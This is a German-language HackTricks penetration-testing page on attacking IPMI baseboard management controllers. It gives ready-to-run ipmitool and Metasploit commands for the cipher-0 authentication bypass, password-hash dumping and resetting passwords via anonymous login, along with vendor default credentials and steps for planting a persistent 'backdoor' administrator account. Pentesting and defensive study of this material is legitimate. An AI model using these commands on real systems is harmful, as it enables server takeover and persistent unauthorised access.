# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Grundinformationen

### **√úberblick √ºber IPMI**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** bietet einen standardisierten Ansatz f√ºr das Remote-Management und die √úberwachung von Computersystemen, unabh√§ngig vom Betriebssystem oder dem Stromzustand. Diese Technologie erm√∂glicht es Systemadministratoren, Systeme aus der Ferne zu verwalten, selbst wenn sie ausgeschaltet oder nicht ansprechbar sind, und ist besonders n√ºtzlich f√ºr:

- Pre-OS-Boot-Konfigurationen
- Verwaltung des Stromausfalls
- Wiederherstellung von Systemfehlern

IPMI ist in der Lage, Temperaturen, Spannungen, L√ºftergeschwindigkeiten und Stromversorgungen zu √ºberwachen, sowie Inventarinformationen bereitzustellen, Hardwareprotokolle zu √ºberpr√ºfen und Warnungen √ºber SNMP zu senden. F√ºr den Betrieb sind eine Stromquelle und eine LAN-Verbindung erforderlich.

Seit seiner Einf√ºhrung durch Intel im Jahr 1998 wird IPMI von zahlreichen Anbietern unterst√ºtzt, was die Remote-Management-Funktionen verbessert, insbesondere mit der Unterst√ºtzung von Version 2.0 f√ºr serielle Verbindungen √ºber LAN. Zu den Hauptkomponenten geh√∂ren:

- **Baseboard Management Controller (BMC):** Der Hauptmikrocontroller f√ºr IPMI-Operationen.
- **Kommunikationsbusse und -schnittstellen:** F√ºr interne und externe Kommunikation, einschlie√ülich ICMB, IPMB und verschiedener Schnittstellen f√ºr lokale und Netzwerkverbindungen.
- **IPMI-Speicher:** Zum Speichern von Protokollen und Daten.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Standardport**: 623/UDP/TCP (Es l√§uft normalerweise √ºber UDP, kann aber auch √ºber TCP betrieben werden)

## Enumeration

### Entdeckung
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Du kannst die **Version** mit folgendem Befehl **identifizieren**:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI-Sicherheitsanf√§lligkeiten

Im Bereich von IPMI 2.0 wurde von Dan Farmer eine bedeutende Sicherheitsanf√§lligkeit entdeckt, die eine Schwachstelle durch **Cipher-Typ 0** aufdeckte. Diese Schwachstelle, die detailliert in [Dan Farmers Forschung](http://fish2.com/ipmi/cipherzero.html) dokumentiert ist, erm√∂glicht unbefugten Zugriff mit jedem Passwort, sofern ein g√ºltiger Benutzer ins Visier genommen wird. Diese Schw√§che wurde bei verschiedenen BMCs von Herstellern wie HP, Dell und Supermicro gefunden, was auf ein weit verbreitetes Problem in allen IPMI 2.0-Implementierungen hindeutet.

### **IPMI-Authentifizierungsumgehung √ºber Cipher 0**

Um diese Schwachstelle zu erkennen, kann der folgende Metasploit-Hilfsscanner verwendet werden:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Die Ausnutzung dieses Fehlers ist mit `ipmitool` m√∂glich, wie unten gezeigt, was das Auflisten und √Ñndern von Benutzerpassw√∂rtern erm√∂glicht:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP-Authentifizierung Remote-Passwort-Hash-Abfrage**

Diese Schwachstelle erm√∂glicht die Abfrage von gesalzenen, gehashten Passw√∂rtern (MD5 und SHA1) f√ºr jeden vorhandenen Benutzernamen. Um diese Schwachstelle zu testen, bietet Metasploit ein Modul an:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI Anonyme Authentifizierung**

Eine Standardkonfiguration in vielen BMCs erm√∂glicht den "anonymen" Zugriff, der durch leere Benutzername- und Passwortzeichenfolgen gekennzeichnet ist. Diese Konfiguration kann ausgenutzt werden, um die Passw√∂rter von benannten Benutzerkonten mit `ipmitool` zur√ºckzusetzen:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI Klartext-Passw√∂rter**

Eine kritische Designentscheidung in IPMI 2.0 erfordert die Speicherung von Klartext-Passw√∂rtern innerhalb von BMCs zu Authentifizierungszwecken. Die Speicherung dieser Passw√∂rter durch Supermicro an Orten wie `/nv/PSBlock` oder `/nv/PSStore` wirft erhebliche Sicherheitsbedenken auf:
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP Verwundbarkeit**

Die Einbeziehung eines UPnP SSDP-Listeners in die IPMI-Firmware von Supermicro, insbesondere auf UDP-Port 1900, stellt ein erhebliches Sicherheitsrisiko dar. Verwundbarkeiten im Intel SDK f√ºr UPnP-Ger√§te Version 1.3.1, wie in [Rapid7s Offenlegung](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) beschrieben, erm√∂glichen den Root-Zugriff auf das BMC:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

**HP randomisiert das Standardpasswort** f√ºr sein **Integrated Lights Out (iLO)** Produkt w√§hrend der Herstellung. Diese Praxis steht im Gegensatz zu anderen Herstellern, die dazu neigen, **statische Standardanmeldeinformationen** zu verwenden. Eine Zusammenfassung der Standardbenutzernamen und -passw√∂rter f√ºr verschiedene Produkte ist wie folgt:

- **HP Integrated Lights Out (iLO)** verwendet eine **fabrikm√§√üig randomisierte 8-Zeichen-Zeichenfolge** als Standardpasswort, was ein h√∂heres Sicherheitsniveau zeigt.
- Produkte wie **Dells iDRAC, IBMs IMM** und **Fujitsus Integrated Remote Management Controller** verwenden leicht zu erratende Passw√∂rter wie "calvin", "PASSW0RD" (mit einer Null) und "admin".
- Ebenso verwenden **Supermicro IPMI (2.0), Oracle/Sun ILOM** und **ASUS iKVM BMC** ebenfalls einfache Standardanmeldeinformationen, wobei "ADMIN", "changeme" und "admin" als ihre Passw√∂rter dienen.


## Accessing the Host via BMC

Der administrative Zugriff auf den Baseboard Management Controller (BMC) er√∂ffnet verschiedene Wege, um auf das Betriebssystem des Hosts zuzugreifen. Ein einfacher Ansatz besteht darin, die KVM-Funktionalit√§t des BMC auszunutzen. Dies kann entweder durch einen Neustart des Hosts zu einer Root-Shell √ºber GRUB (unter Verwendung von `init=/bin/sh`) oder durch das Booten von einer virtuellen CD-ROM, die als Rettungsdiskette festgelegt ist, erfolgen. Solche Methoden erm√∂glichen eine direkte Manipulation der Festplatte des Hosts, einschlie√ülich der Einf√ºgung von Backdoors, Datenextraktion oder anderer notwendiger Ma√ünahmen f√ºr eine Sicherheitsbewertung. Dies erfordert jedoch einen Neustart des Hosts, was ein erhebliches Manko darstellt. Ohne Neustart ist der Zugriff auf den laufenden Host komplexer und variiert je nach Konfiguration des Hosts. Wenn die physische oder serielle Konsole des Hosts angemeldet bleibt, kann sie leicht √ºber die KVM- oder Serial-over-LAN (sol) Funktionen des BMC √ºber `ipmitool` √ºbernommen werden. Die Erforschung der Ausnutzung gemeinsamer Hardware-Ressourcen, wie dem i2c-Bus und dem Super I/O-Chip, ist ein Bereich, der weitere Untersuchungen erfordert.

## Introducing Backdoors into BMC from the Host

Nach der Kompromittierung eines Hosts, der mit einem BMC ausgestattet ist, kann die **lokale BMC-Schnittstelle genutzt werden, um ein Backdoor-Benutzerkonto einzuf√ºgen**, was eine dauerhafte Pr√§senz auf dem Server schafft. Dieser Angriff erfordert das Vorhandensein von **`ipmitool`** auf dem kompromittierten Host und die Aktivierung der BMC-Treiberunterst√ºtzung. Die folgenden Befehle veranschaulichen, wie ein neues Benutzerkonto in das BMC √ºber die lokale Schnittstelle des Hosts injiziert werden kann, was die Notwendigkeit einer Authentifizierung umgeht. Diese Technik ist auf eine Vielzahl von Betriebssystemen anwendbar, einschlie√ülich Linux, Windows, BSD und sogar DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
